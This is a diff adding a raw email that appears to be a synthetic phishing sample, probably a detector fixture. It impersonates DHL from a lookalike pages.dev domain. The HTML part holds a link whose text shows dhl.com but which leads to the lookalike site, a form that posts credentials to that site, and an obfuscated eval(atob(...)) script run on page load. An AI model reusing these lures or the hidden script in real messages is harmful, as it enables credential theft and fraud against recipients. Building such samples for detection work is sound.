@@ -1,0 +1,30 @@
+From: notice@dhl-verify.pages.dev
+To: victim7@example.com
+Subject: Monthly statement available [ref U84D953]
+Date: Tue, 08 Mar 2002 01:32:00 -0500
+Message-ID: <phish-67-136199b6-b026-48ad-87e3-67e201099afb@dhl-verify.pages.dev>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 24 Mar 2002 05:10:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 11 Mar 2002 15:35:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 06 Mar 2002 20:44:00 -0500
+Return-Path: <notice@dhl-verify.pages.dev>
+Reply-To: notice@dhl-verify.pages.dev
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=dhl-verify.pages.dev; dkim=pass header.d=dhl-verify.pages.dev; dmarc=pass header.from=dhl-verify.pages.dev
+Received-SPF: pass (mx.example.com: domain of notice@dhl-verify.pages.dev designates 192.0.2.47 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=dhl-verify.pages.dev; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-67-ba029f54"
+
+--bnd-p-67-ba029f54
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+Your monthly statement is ready. Open the link below.
+https://dhl-verify.pages.dev/statement/U84D953
+
+Reference: U84D953
+--bnd-p-67-ba029f54
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>Your monthly statement is ready. Open the link below.<br/>https://dhl-verify.pages.dev/statement/U84D953<br/><br/>Reference: U84D953</p><p><a href="http://dhl-verify.pages.dev/login">https://www.dhl.com/signin</a></p><form action="http://dhl-verify.pages.dev/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-67-ba029f54--
